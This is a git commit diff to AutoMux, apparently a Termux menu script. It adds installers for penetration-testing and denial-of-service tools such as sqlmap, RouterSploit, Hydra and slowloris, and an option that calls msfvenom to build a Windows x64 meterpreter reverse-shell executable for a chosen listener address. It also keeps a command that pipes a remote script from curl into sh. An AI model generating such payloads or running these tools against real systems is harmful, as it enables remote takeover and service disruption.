42c21520612137e149ae7af43e08f6416a3a4de0
Bcap03 <bcap03@qq.com>
2020-03-05 01:28:24 -0500

    big update

--- Module/AMcore.py
+++ Module/AMcore.py
@@ -15,6 +15,10 @@ AM_banner =  """
 
 """                                       
 
+backmenu_banner = """
+    [99] Bcak Menu
+    [00] Exit
+"""
 def banner():
     print(colored(AM_banner,"blue"))
     print(colored("Tips.后面带有","blue") + colored("「Root」","red") + colored("标识的需要手机","blue")+colored("有Root权限!!!","red"))
@@ -25,20 +29,33 @@ def restart():
 	os.execl(python, python, * sys.argv)
 	curdir = os.getcwd()
 
+def backmenu():
+    print(backmenu_banner)
+    backtomenu = input(colored("AutoMux >>> ","yellow"))
+    if backtomenu == "99" or backtomenu == "9":
+        restart()
+    elif backtomenu == "00" or backtomenu == "0":
+        sys.exit()
+    else:
+        print(colored("\n输入错误，请重新输入！\n","red"))
+        timeout(2)
+        restart()  
+
 def okay():
     print(colored("\n安装成功！2秒后重启AutoMux\n","green"))
     timeout(2)
     restart()
     
 def install_lazymux():
-    print(colored("安装Lazymux中，请稍后...","green"))
-    os.system("git clone https://github.com/Gameye98/Lazymux.git")
+    print(colored("克隆Lazymux中，请稍后...","green"))
+    os.system("git clone https://github.com/Gameye98/Lazymux.git $HOME/Lazymux")
     okay()
 
 def install_Hydra():
     print(colored("安装Hydra中，请稍后...","green"))
     os.system("apt install hydra -y")
-    okay()
+    print(colored("安装完成，输入'hydra'启动","green"))
+    backmenu()
 
 def qhd():
     print(colored("更换清华源中，请稍后...","green"))
@@ -62,12 +79,14 @@ def install_msf():
     print(colored("安装msf中，请稍候...","green"))
     os.system("apt install unstable-repo -y")
     os.system("apt install metasploit -y")
-    okay()
+    print(colored("安装完成，输入'msfconsole'启动","green"))
+    backmenu()
 
 def install_nmap():
     print(colored("安装Nmap中，请稍候...","green"))
     os.system("apt install nmap -y")
-    okay()
+    print(colored("安装完成，输入'nmap'启动","green"))
+    backmenu()
 
 def repair_msf():
     print(colored("修复msf数据库中，请稍候...","green"))
@@ -81,6 +100,45 @@ def install_zsh():
     os.system('sh -c "$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh )"')
     okay()
 
+def install_sqlmap():
+    print(colored("安装sqlmap中，请稍候...","green"))
+    os.system("apt install unstable-repo -y")
+    os.system("apt install sqlmap -y")
+    print(colored("安装完成，输入'sqlmap'启动","green"))
+    backmenu()
+
+def install_RouterSploit():
+    print(colored("克隆RouterSploit中，请稍候...","green"))
+    os.system("git clone https://www.github.com/threat9/routersploit $HOME/routersploit")
+    okay()
+
+def install_RED_HAWK():
+    print(colored("克隆RED_HAWK中，请稍候...","green"))
+    os.system("apt install php")
+    os.system("git clone https://github.com/Tuhinshubhra/RED_HAWK.git $HOME/RED_HAWK")
+    okay()
+
+def install_slowloris():
+    print(colored("克隆slowloris中，请稍候...","green"))
+    os.system("git clone https://github.com/gkbrk/slowloris.git $HOME/slowloris")
+    okay() 
+
+def install_dnsmap():
+    print(colored("克隆dnsmap中，请稍候...","green"))
+    os.system("git clone https://github.com/makefu/dnsmap.git $HOME/dnsmap")
+    okay() 
+
+def install_sslscan():
+    print(colored("克隆sslscan中，请稍候...","green"))
+    os.system("git clone https://github.com/rbsec/sslscan.git $HOME/sslscan")
+    okay() 
+
+def install_SlowHTTPTest():
+    print(colored("克隆SlowHTTPTest中，请稍候...","green"))
+    os.system("git clone https://github.com/shekyan/slowhttptest.git $HOME/slowhttptest")
+    okay() 
+    
+
 def WindouwsMM():
     LHOST = input(colored("请输入本机IP地址 >>> ","green"))
     LPORT = input(colored("请输入要监听的端口 >>> ","green"))
@@ -91,6 +149,18 @@ def WindouwsMM():
     print(colored("生成完毕!2秒后重启程序","yellow"))
     timeout(2)
     restart()
+
+def Windouws64MM():
+    LHOST = input(colored("请输入本机IP地址 >>> ","green"))
+    LPORT = input(colored("请输入要监听的端口 >>> ","green"))
+    exenmap = input(colored("请输入文件名字(.exe) >>> ","green"))
+    bcml = input(colored("请输入保存地址 >>> ","green"))
+    print(colored("正在为Windouws X64生成LHOST为: %s LPORT为: %s 的 %s文件...","yellow") %(LHOST,LPORT,exenmap))
+    os.system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s/%s" % (LHOST,LPORT,bcml,exenmap))
+    print(colored("生成完毕!2秒后重启程序","yellow"))
+    timeout(2)
+    restart()
+
 
 def AndroidMM():
     LHOST = input(colored("请输入本机IP地址 >>> ","green"))
@@ -106,11 +176,13 @@ def AndroidMM():
 def msf_mm():
     print(colored("\n请选择运行系统:\n","blue"))
     print("    [01]  Windows")
-    print("    [02]  Android\n")
-    print("    [00]  返回主菜单\n")
+    print("    [02]  Windows X64")
+    print("    [03]  Android\n")
+    print("    [00]  Bcak Menu\n")
     OS = input(colored("AutoMux >>> ","yellow"))
     if OS.strip() == "1" or OS.strip() == "01":WindouwsMM()
-    elif OS.strip() == "2" or OS.strip() == "02":AndroidMM()
+    elif OS.strip() == "2" or OS.strip() == "02":Windouws64MM()
+    elif OS.strip() == "3" or OS.strip() == "03":AndroidMM()
     elif OS.strip() == "0" or OS.strip() == "00":restart()
     else:
         print(colored("\n输入错误，请重新输入！\n","red"))
